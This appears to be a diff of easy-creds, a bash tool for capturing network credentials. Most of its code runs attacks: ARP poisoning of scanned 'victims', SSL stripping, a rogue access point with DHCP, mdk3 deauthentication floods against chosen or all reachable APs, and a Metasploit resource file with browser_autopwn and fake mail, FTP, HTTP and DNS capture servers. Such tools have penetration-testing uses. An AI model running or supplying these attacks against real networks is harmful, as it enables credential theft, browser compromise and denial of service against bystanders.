@@ -3,9 +3,9 @@
 ##################################################################################################################
 # easy-creds is a simple bash script which makes sniffing networks for credentials a little easier.              #
 #                                                                                                                #
-# J0hnnyBrav0 (@Brav0hax) & al14s (@al14s)                                                                       #
+# J0hnnyBrav0 (@Brav0hax) & help from al14s (@al14s)                                                             #
 ##################################################################################################################
-# v3.7.6 - 07/09/2012
+# v3.7 - 10/26/2012
 #
 # Copyright (C) 2012  Eric Milam
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
@@ -69,27 +69,68 @@ fi
 
 ##################################################
 f_findpaths(){
-	# Find where e-c programs exists on system
-	ecpath=$(locate easy-creds.sh | sed 's,/*[^/]\+/*$,,')
-	ferretpath=$(locate -b '\ferret'| sed 's,/*[^/]\+/*$,,')
-	airodumppath=$(locate -b '\airodump-ng'| sed 's,/*[^/]\+/*$,,')
-	locate -b '\airbase-ng' > /tmp/airbase.check
-	for i in $(cat /tmp/airbase.check); do
-	 if [ ! -d $i ] && [ -x $i ]; then
-	  airbasepath=$($i | sed 's,/*[^/]\+/*$,,')
-	 fi
-	done
+	
+# You have 2 options here. easy-creds can use 'locate' to attempt to find the proper executables, or you can declare them statically.
+# I originally used the locate function, but I found it a bit clumsy, so declaring a direct path would be best.
 
-	# Find the hamster executable
-	hamsterpath=$(locate -b '\hamster.js' | sed 's,/*[^/]\+/*$,,')
-
-	# Find the aircrack executable
-	locate -b '\aircrack-ng' > /tmp/aircrack.check
-	for i in $(cat /tmp/aircrack.check); do
-	 if [ ! -d $i ] && [ -x $i ]; then
-	  aircrackpath=$($i | sed 's,/*[^/]\+/*$,,')
-	 fi
-	done
+#To have easy-creds do a 'locate' uncomment the block below and comment out the block of code with static paths
+# Variable Path Lookups
+#	ecpath=$(locate easy-creds.sh | sed 's,/*[^/]\+/*$,,')
+#	ferretpath=$(locate -b '\ferret'| sed 's,/*[^/]\+/*$,,')
+#	airodumppath=$(locate -b '\airodump-ng'| sed 's,/*[^/]\+/*$,,')
+#	locate -b '\airbase-ng' > /tmp/ec/airbase.check
+#	for i in $(cat /tmp/ec/airbase.check); do
+#	 if [ ! -d $i ] && [ -x $i ]; then
+#	  airbasepath=$($i | sed 's,/*[^/]\+/*$,,')
+#	 fi
+#	done
+#	hamsterpath=$(locate -b '\hamster.js' | sed 's,/*[^/]\+/*$,,')
+#	locate -b '\aircrack-ng' > /tmp/ec/aircrack.check
+#	for i in $(cat /tmp/ec/aircrack.check); do
+#	 if [ ! -d $i ] && [ -x $i ]; then
+#	  aircrackpath=$($i | sed 's,/*[^/]\+/*$,,')
+#	 fi
+#	done
+#
+#	pathtoradiusd=$(locate -b -l 1 '\radiusd' | sed 's,/*[^/]\+/*$,,')
+#	pathtoradiusconf=$(locate -b -l 1 '\radiusd.conf' | sed 's,/*[^/]\+/*$,,')
+#
+#	if [ ! -e /usr/sbin/hostapd ]; then
+#	 locate -b '\hostapd' | sed 's,/*[^/]\+/*$,,' > /tmp/ec/hostapd.find
+#	  while [ ! -d $pathtohostapd ] && [ -x $pathtohostapd ]; do
+#	  for i in $(cat /tmp/ec/hostapd.find); do
+#	   pathtohostapd=$i
+#	  done
+#	 done
+#	else
+#	 pathtohostapd=/usr/sbin
+#	fi
+#
+#	 findradiuslog=$(locate  -b 'radius.log' | sed 's,/*[^/]\+/*$,,')
+#
+#	if [ ! -e "/usr/bin/asleap" ]; then
+#		asleappath=$(locate -l 1 -b "\asleap"|sed 's,/*[^/]\+/*$,,')
+#	else
+#		asleappath=/usr/bin
+#	fi
+########
+#
+#Static Path Declarations <- Much easier ;-)
+	airbasepath="/usr/local/sbin"
+	aircrackpath="/usr/local/bin"
+	airodumppath="/usr/local/sbin"
+	asleappath="/usr/bin/"
+	ecpath="/root/Desktop/easy-creds-3.7"
+	etterpath="/usr/local/bin"
+	ferretpath="/opt/sidejack"
+	freeradiuslog="/usr/local/var/log/radius/freeradius-server-wpe.log"
+	hamsterpath="/opt/sidejack"
+	mdk3path="/usr/local/sbin"
+	pathtohostapd="/usr/sbin"
+	pathtoradiusd="/usr/local/sbin"
+	pathtoradiusconf="/usr/local/etc/raddb"
+	sslstrippath="/pentest/web/sslstrip"
+########
 }
 
 
@@ -107,6 +148,7 @@ f_checkexit(){
 	if [ -z $clean ]; then
 		f_Quit
 	else
+		rm -rf /tmp/ec
 		clear
 		exit 2> /dev/null
 	fi
@@ -115,11 +157,17 @@ f_checkexit(){
 f_Quit(){
 	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
 	sleep 3
-	kill $(pidof ettercap) $(pidof urlsnarf) $(pidof dsniff) $(cat /tmp/sslstrip.pid)  $(pidof hamster) $(pidof ferret)
+	
+	if [ -e /tmp/ec/sslstrip.pid ]; then kill $(cat /tmp/ec/sslstrip.pid); fi
+	if [ ! -z $(pidof hamster) ]; then kill $(pidof hamster); fi
+	if [ ! -z $(pidof ferret) ]; then kill $(pidof ferret); fi
+	if [ ! -z $(pidof ettercap) ]; then kill $(pidof ettercap); fi
+	if [ ! -z $(pidof urlsnarf) ]; then kill $(pidof urlsnarf); fi
+	if [ ! -z $(pidof dsniff) ]; then kill $(pidof dsniff); fi
 
 	if [ ! -z $wireless ]; then
-	 kill $(pidof airbase-ng) $(pidof hamster) $(pidof ferret)  $(cat /tmp/tail.pid)
-	 if [ -e /tmp/sleep.pid ]; then kill $(cat /tmp/sleep.pid); fi
+	 kill $(pidof airbase-ng) $(pidof hamster) $(pidof ferret)  $(cat /tmp/ec/tail.pid)
+	 if [ -e /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
 	 service dhcp3-server stop &> /dev/null
 	 iptables --flush
 	 iptables --table nat --flush
@@ -142,28 +190,27 @@ f_Quit(){
 	fi
 
 	if [ ! -z $karmasploit ] ; then
-	 kill $(cat /tmp/ec-karma-pid) &> /dev/null
-	 rm /tmp/ec-karma-pid
-	 kill $(cat /tmp/ec-metasploit-pid) &> /dev/null
-	 rm /tmp/ec-metasploit-pid
+	 kill $(cat /tmp/ec/ec-karma-pid) &> /dev/null
+	 kill $(cat /tmp/ec/ec-metasploit-pid) &> /dev/null
 	fi
 
 	if [ ! -z $fra ]; then
 	 kill $(pidof radiusd) &> /dev/null
 	 kill $(pidof hostapd) &> /dev/null
-	 kill $(cat /tmp/tail.pid) &> /dev/null
-	 kill $(cat /tmp/tshark.pid) &> /dev/null
+	 kill $(cat /tmp/ec/tail.pid) &> /dev/null
+	 kill $(cat /tmp/ec/tshark.pid) &> /dev/null
 	 mv $pathtoradiusconf/radiusd.conf.back $pathtoradiusconf/radiusd.conf
 	 mv $pathtoradiusconf/clients.conf.back $pathtoradiusconf/clients.conf
-	 rm /tmp/ec-hostapd.conf
 	 echo "" > $freeradiuslog
 	fi
 
 	if [ "$mainchoice" == "5" ]; then
 	 clear
+	 rm -rf /tmp/ec
 	 exit 2> /dev/null
 	fi
-
+	
+	rm -rf /tmp/ec
 	bash $0 $logfldr
 	kill $$ 2> /dev/null
 	clean=1
@@ -270,17 +317,14 @@ f_aircrackupdate(){
 	clear
 	f_Banner
 
-	echo -e "\e[1;33m[*] The aircrack-ng SVN no longer exists updating airodump-ng OUI.\e[0m\n"
-	# Find airodump-ng-oui-update
-	locate -b 'airodump-ng-oui-update' > /tmp/airodump-ng-oui-update.check
-	for i in $(cat /tmp/airodump-ng-oui-update.check); do
-	 if [ ! -d $i ] && [ -x $i ]; then
-	  airodumpngouiupdatepath=$i
-	 fi
-	done
-
-	bash $airodumpngouiupdatepath
-
+	echo -e "\n\e[1;33m[*] Updating aircrack-ng from SVN, please be patient...\e[0m"
+	svn co http://trac.aircrack-ng.org/svn/trunk/ /tmp/ec/aircrack-ng
+	cd /tmp/ec/aircrack-ng/
+	make && make install > /dev/null
+	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
+	sleep 2
+	echo -e "\e[1;33m[*] Updating airodump-ng OUI.\e[0m\n"
+	bash $airodumppath/airodump-ng-oui-update > /dev/null
 	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
 	sleep 1
 
@@ -293,7 +337,6 @@ f_aircrackupdate(){
 f_sslstrip_vercheck(){
 	clear
 	f_Banner
-	sslstrippath=$(locate -b '\sslstrip.py'|sed 's,/*[^/]\+/*$,,')
 	echo -e "\n\e[1;33m[*] Checking the thoughtcrime website for the latest version of SSLStrip...\e[0m\n"
 
 	#Get the installed version
@@ -301,11 +344,9 @@ f_sslstrip_vercheck(){
 	installedver=$(cat $sslstrippath/setup.py|grep version|cut -d "'" -f2)
 
 	# Change to tmp folder to keep things clean then get the index.html from thoughtcrime.com for SSLStrip
-	cd /tmp/
+	cd /tmp/ec
 	wget -q http://www.thoughtcrime.org/software/sslstrip/index.html
-	latestver=$(cat index.html | grep "cd sslstrip"|cut -d "-" -f2)
-	#clean up the mess
-	rm /tmp/index.html
+	latestver=$(cat index.html | grep "cd sslstrip"| cut -d "-" -f2|cut -d "<" -f1)
 	cd $location
 
 	echo -e "\n\e[1;33m[*] Installed version of SSLStrip: $installedver\e[0m\n"
@@ -332,7 +373,7 @@ f_sslstripupdate(){
 	echo -e "\n\e[1;31m[-] This will install SSLStrip from the thoughtcrime website, not the repositories.\e[0m\n\e[1;33m[*] Hit return to continue or ctrl-c to cancel and return to main menu.\e[0"
 	read
 
-	cp -R "$sslstrippath" /tmp/sslstrip-$installedver
+	cp -R "$sslstrippath" /tmp/ec/sslstrip-$installedver
 
 	echo -e "\n\e[1;33m[*] Downloading the tar file...\e[0m"
 	cd /tmp
@@ -340,18 +381,23 @@ f_sslstripupdate(){
 
 	echo -e "\n\e[1;33m[*] Installing the latest version of SSLStrip...\e[0m"
 	tar -zxvf sslstrip-$latestver.tar.gz
-	mv -f /tmp/sslstrip-$latestver/ $sslstrippath/
+	mv -f /tmp/ec/sslstrip-$latestver/ $sslstrippath/
 	$sslstrippath/setup.py install &> /dev/null
 	cd $location
 
 	echo -e "\n\e[1;32m[+] Version $latestver has been installed.\e[0m\n"
 	sleep 2
-
-	#clean up the mess
-	rm -rf /tmp/sslstrip-$latestver
-	rm /tmp/sslstrip-$latestver.tar.gz
 }
-
+##################################################
+f_howtos(){
+	xdg-open http://www.youtube.com/brav0hax/videos &
+	f_prereqs 
+}
+##################################################
+f_pbs(){
+	xdg-open http://www.youtube.com/watch?v=OFzXaFbxDcM &
+	f_mainmenu
+}
 ##################################################
 #
 # POISONING ATTACK FUNCTIONS
@@ -414,9 +460,9 @@ f_HostScan(){
 	#take our addresses out of the mix  ;)
 	myaddrs=$(printf "%s," $(ifconfig | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}' | sed 's/addr://g'))
 
-	nmap -PR -n -sn $range --exclude $myaddrs -oN /tmp/nmap.scan
+	nmap -PR -n -sn $range --exclude $myaddrs -oN /tmp/ec/nmap.scan
 
-	grep -e report -e MAC /tmp/nmap.scan | sed '{ N; s/\n/ /; s/Nmap scan report for //g; s/MAC Address: //g; s/ (.\+//g; s/$/ -/; }' > /tmp/victims
+	grep -e report -e MAC /tmp/ec/nmap.scan | sed '{ N; s/\n/ /; s/Nmap scan report for //g; s/MAC Address: //g; s/ (.\+//g; s/$/ -/; }' > /tmp/victims
 
 	echo -e "\n\e[1;33m[*] Your victim host list is at /tmp/victims.\e[0m\n"
 	echo -e "\n\e[1;31m[-] Remember to remove any IPs that should not be poisoned!\e[0m\n" 
@@ -649,41 +695,42 @@ f_fakeapAttack(){
 f_dhcpconf(){
 	valid=
 	while [[ $valid != 1 ]]; do
-	 read -e -p "Path to the dhcpd.conf file [/etc/dhcp3/]: " DHCPPATH
-	 if [ -z "$DHCPPATH" ]; then DHCPPATH=/etc/dhcp3/dhcpd.conf; fi
-	 if [ ! -f "$DHCPPATH" ]; then
+	 read -e -p "Path to the dhcpd.conf file [/etc/dhcp/dhpcd.conf]: " DHCPPATH
+	 if [ -z "$DHCPPATH" ]; then DHCPPATH=/etc/dhcp/dhcpd.conf; fi
+	 
+	if [ ! -f "$DHCPPATH" ]; then
 		echo -e "File not found - $DHCPPATH\n"
 	 else
 		valid=1
 	 fi
 	done
 
+	cat $DHCPPATH > /tmp/ec/dhcp.conf
+	mv /tmp/ec/dhcp.conf /etc/dhcp/dhcpd.conf
+	DHCPPATH="/etc/dhcp/dhcp.conf"
+
 	#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
 	ATNET=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f2)
 	ATIP=$(cat $DHCPPATH |grep -i "option routers"|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
 	ATSUB=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f4)
 	ATCIDR=$(ipcalc -b $ATNET/$ATSUB|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\/[0-9]\{1,2\}')
+
 }
 
 
 ##################################################
 f_ipcalc(){
-	
-	if [ -e /etc/dhcp3/dhcpd.conf ]; then
-		DHCPPATH=/etc/dhcp3/dhcpd.conf
-	else
-		DHCPPATH=/etc/dhcp/dhcpd.conf
-	fi
+	DHCPPATH=/etc/dhcp/dhcpd.conf
 
 	#use ipcalc to complete the DHCP setup
-	ipcalc "$ATCIDR" > /tmp/atcidr
-	ATNET=$(cat /tmp/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
-	ATIP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
-	ATSUB=$(cat /tmp/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
-	ATBROAD=$(cat /tmp/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
-	ATLSTARTTMP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
+	ipcalc "$ATCIDR" > /tmp/ec/atcidr
+	ATNET=$(cat /tmp/ec/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
+	ATIP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
+	ATSUB=$(cat /tmp/ec/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
+	ATBROAD=$(cat /tmp/ec/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
+	ATLSTARTTMP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
 	ATLSTART=$(echo $ATLSTARTTMP.100)
-	ATLENDTMP=$(cat /tmp/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
+	ATLENDTMP=$(cat /tmp/ec/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
 	ATLEND=$(echo $ATLENDTMP.200)
 
 	echo -e "\n\n\e[1;33m[*] Creating a dhcpd.conf to assign addresses to clients that connect to us.\e[0m"
@@ -758,7 +805,7 @@ f_dhcptunnel(){
 	 y=$(($y+$yoffset))
 	 xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
-	echo $! > /tmp/tail.pid
+	echo $! > /tmp/ec/tail.pid
 	sleep 3
 
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
@@ -769,7 +816,7 @@ f_dhcptunnel(){
 	else
 		service dhcpd start
 	fi
-
+	
 	sleep 3
 	f_finalstage
 	f_mainmenu
@@ -798,7 +845,7 @@ f_finalstage(){
 		  screen -dmS easy-creds -t sslstrip sslstrip -pfk -w $logfldr/$sslstripfilename
 		fi
 	fi
-	echo $! > /tmp/sslstrip.pid
+	echo $! > /tmp/ec/sslstrip.pid
 	sleep 2
 	f_ecap
 	sleep 1
@@ -864,7 +911,7 @@ f_mdk3aps(){
 	dosattack=1
 
 	# grep the MACs to a temp white list
-	ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-white.lst
+	ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst
 	echo
 
 	read -p "Do you have the BSSID address of the AP you'd like to attack? [y/N]: " havemac
@@ -875,7 +922,7 @@ f_mdk3aps(){
 	 dosmac=
 	 while [ -z "$dosmac" ]; do read -p "Please enter the BSSID address of the AP you wish to DoS: " dosmac; done
 
-	 echo "$dosmac" > /tmp/ec-dosap
+	 echo "$dosmac" > /tmp/ec/ec-dosap
 	 airmon-ng | egrep 'wlan|ath' | sed '$a\\n'
 	 doswlan=
 	 while [ -z $doswlan ];do read -p "Please enter the wireless device to use for DoS attack: " doswlan; done
@@ -894,14 +941,14 @@ f_mdk3aps(){
 	 sleep 1
 
 	if [ -z $isxrunning ]; then
-		screen -S easy-creds -t MDK3-DoS -X screen mdk3 $dosmon d -b /tmp/ec-dosap
+		screen -S easy-creds -t MDK3-DoS -X screen mdk3 $dosmon d -b /tmp/ec/ec-dosap
 	else
-	 	xterm -geometry "$width"x$height+$x-$y -T "MDK3 AP DoS" -e mdk3 $dosmon d -b /tmp/ec-dosap &
+	 	xterm -geometry "$width"x$height+$x-$y -T "MDK3 AP DoS" -e mdk3 $dosmon d -b /tmp/ec/ec-dosap &
 	fi
 
 	 echo $! > /tmp/dosap-pid
-	 sleep 5m && kill $(cat /tmp/dosap-pid) &
-	 echo $! > /tmp/sleep.pid
+	 sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
+	 echo $! > /tmp/ec/sleep.pid
 	 echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
 	else
 	 f_getbssids
@@ -918,7 +965,7 @@ f_lastman(){
 	echo -e "\n\e[1;33m[*] This attack will DoS every AP BSSID & Client MAC it can reach.\e[0m\n\e[1;31mUse with extreme caution\e[0m\n\n"
 
 	# grep the MACs to a temp white list
-	ifconfig | grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-white.lst
+	ifconfig | grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst
 
 	airmon-ng | egrep '(wlan|mon)' | sed '$a\\n'
 	doswlan=
@@ -935,13 +982,13 @@ f_lastman(){
 	echo -e "\nUsing $dosmon for attack."
 
 	if [ -z $isxrunning ]; then
-		screen -S easy-creds -t Last-Man-Standing -X screen mdk3 $dosmon d -w /tmp/ec-white.lst;(airmon-ng stop $dosmon >/dev/null)
+		screen -S easy-creds -t Last-Man-Standing -X screen mdk3 $dosmon d -w /tmp/ec/ec-white.lst;(airmon-ng stop $dosmon >/dev/null)
 	else
-		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 $dosmon d -w /tmp/ec-white.lst;(airmon-ng stop $dosmon >/dev/null) &
+		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 $dosmon d -w /tmp/ec/ec-white.lst;(airmon-ng stop $dosmon >/dev/null) &
 	fi
-	echo $! > /tmp/dosap-pid
-	sleep 5m && kill $(cat /tmp/dosap-pid) &
-	echo $! > /tmp/sleep.pid
+	echo $! > /tmp/ec/dosap-pid
+	sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
+	echo $! > /tmp/ec/sleep.pid
 
 	airmon-ng stop $dosmon >/dev/null
 
@@ -972,13 +1019,13 @@ f_getbssids(){
 	echo -e "\n\e[1;33m[*] Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m\n"
 
 	if [ -z $isxrunning ]; then
-		screen -S easy-creds -t Airodump -X screen $airodumppath/airodump-ng $airomon -w /tmp/airodump-ec --output-format csv
+		screen -S easy-creds -t Airodump -X screen $airodumppath/airodump-ng $airomon -w /tmp/ec/airodump-ec --output-format csv
 	else
-		xterm -geometry 90x25+0+0 -T "Airodump" -e $airodumppath/airodump-ng $airomon -w /tmp/airodump-ec --output-format csv &
+		xterm -geometry 90x25+0+0 -T "Airodump" -e $airodumppath/airodump-ng $airomon -w /tmp/ec/airodump-ec --output-format csv &
 	fi
-	echo $! > /tmp/airodump-pid
+	echo $! > /tmp/ec/airodump-pid
 	#wait for the process to die
-	while [ ! -z $(ps -p "$(cat /tmp/airodump-pid)" | grep "$(cat /tmp/airodump-pid)" | sed 's/ //g') ]; do sleep 1; done
+	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump-pid)" | grep "$(cat /tmp/ec/airodump-pid)" | sed 's/ //g') ]; do sleep 1; done
 	sleep 1
 
 	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
@@ -989,7 +1036,7 @@ f_getbssids(){
 	#IFS variable allows for spaces in the name of the ESSIDs and will still display it on one line 
 	SAVEIFS=$IFS
 	IFS=$(echo -en "\n\b")
-	for apname in $(cat /tmp/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14| sort -u);do
+	for apname in $(cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14| sort -u);do
 		echo [*] "$apname"
 	done
 	echo
@@ -1000,22 +1047,22 @@ f_getbssids(){
 	 read -p "Please enter the ESSID you'd like to attack: " dosapname
 	done
 
-	cat /tmp/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| grep -a -i "$dosapname" |cut -d "," -f1 > /tmp/ec-macs
-	rm /tmp/airodump-ec*
+	cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| grep -a -i "$dosapname" |cut -d "," -f1 > /tmp/ec/ec-macs
+	rm /tmp/ec/airodump-ec*
 
 	#Make sure none of your MACs end up in the blacklist
-	diff -i /tmp/ec-macs /tmp/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-dosap
+	diff -i /tmp/ec/ec-macs /tmp/ec/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-dosap
 
 	echo -e "\nNow Deauthing clients from $dosapname.\n\nIf there is more than one BSSID, all will be attacked...\n"
 	airmon-ng start $airowlan &> /dev/null
 	sleep 1
 
 	if [ -z $isxrunning ]; then
-		screen -S easy-creds -t MDK3-AP-DoS -X screen mdk3 $airomon d -b /tmp/ec-dosap;(airmon-ng stop $airomon >/dev/null)
+		screen -S easy-creds -t MDK3-AP-DoS -X screen mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null)
 		echo -e "\n Exit the MDK3-AP-DoS in the easy-creds session to stop the attack"
 		sleep 5 
 	else
-		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 $airomon d -b /tmp/ec-dosap;(airmon-ng stop $airomon >/dev/null) &
+		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null) &
 		echo -e "\nPlease close the xterm window to stop the attack..."
 		sleep 5
 	fi
@@ -1082,67 +1129,67 @@ f_karmasetup(){
 
 	service mysql start &> /dev/null
 
-	echo "db_driver mysql" > /tmp/karma.rc
-	echo "db_connect root:$MYSPWD@127.0.0.1:$MYSPORT/msfbook" >> /tmp/karma.rc
-	echo "use auxiliary/server/browser_autopwn" >> /tmp/karma.rc
-	echo "setg AUTOPWN_HOST $ATIP" >> /tmp/karma.rc
-	echo "setg AUTOPWN_PORT 55550" >> /tmp/karma.rc
-	echo "setg AUTOPWN_URI /ads" >> /tmp/karma.rc
-	echo "set LHOST $ATIP" >> /tmp/karma.rc
-	echo "set LPORT 45000" >> /tmp/karma.rc
-	echo "set SRVPORT 55550" >> /tmp/karma.rc
-	echo "set URIPATH /ads" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
-	echo "set SRVPORT 110" >> /tmp/karma.rc
-	echo "set SSL false" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
-	echo "set SRVPORT 995" >> /tmp/karma.rc
-	echo "set SSL true" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/ftp" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
-	echo "set SSL false" >> /tmp/karma.rc
-	echo "set SRVPORT 143" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
-	echo "set SSL true" >> /tmp/karma.rc
-	echo "set SRVPORT 993" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
-	echo "set SSL false" >> /tmp/karma.rc
-	echo "set SRVPORT 25" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
-	echo "set SSL true" >> /tmp/karma.rc
-	echo "set SRVPORT 465" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
-	echo "unset TARGETHOST" >> /tmp/karma.rc
-	echo "set SRVPORT 5353" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
-	echo "unset TARGETHOST" >> /tmp/karma.rc
-	echo "set SRVPORT 53" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
-	echo "set SRVPORT 80" >> /tmp/karma.rc
-	echo "set SSL false" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
-	echo "set SRVPORT 8080" >> /tmp/karma.rc
-	echo "set SSL false" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
-	echo "set SRVPORT 443" >> /tmp/karma.rc
-	echo "set SSL true" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
-	echo "set SRVPORT 8443" >> /tmp/karma.rc
-	echo "set SSL true" >> /tmp/karma.rc
-	echo "run" >> /tmp/karma.rc
+	echo "db_driver mysql" > /tmp/ec/karma.rc
+	echo "db_connect root:$MYSPWD@127.0.0.1:$MYSPORT/msfbook" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/browser_autopwn" >> /tmp/ec/karma.rc
+	echo "setg AUTOPWN_HOST $ATIP" >> /tmp/ec/karma.rc
+	echo "setg AUTOPWN_PORT 55550" >> /tmp/ec/karma.rc
+	echo "setg AUTOPWN_URI /ads" >> /tmp/ec/karma.rc
+	echo "set LHOST $ATIP" >> /tmp/ec/karma.rc
+	echo "set LPORT 45000" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 55550" >> /tmp/ec/karma.rc
+	echo "set URIPATH /ads" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 110" >> /tmp/ec/karma.rc
+	echo "set SSL false" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 995" >> /tmp/ec/karma.rc
+	echo "set SSL true" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/ftp" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
+	echo "set SSL false" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 143" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
+	echo "set SSL true" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 993" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
+	echo "set SSL false" >> /tmp/ec/karma.rc
+	echo "set SRVPORT 25" >> /tmp/ec/karma.rc
+	echo "run" >> /tmp/ec/karma.rc
+	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
